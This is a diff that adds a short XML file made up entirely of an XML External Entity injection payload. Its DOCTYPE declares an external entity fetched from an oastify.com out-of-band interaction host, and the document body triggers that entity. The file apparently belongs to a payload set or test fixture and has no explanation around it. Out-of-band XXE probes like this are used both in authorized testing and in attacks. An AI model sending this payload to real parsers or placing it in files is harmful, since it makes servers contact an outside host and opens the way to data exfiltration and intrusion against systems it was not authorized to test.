@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://9kuji86apx935aqmyhjv5dgq2h88wz0np.oastify.com/abc.txt">]><foo>&xxe;</foo>
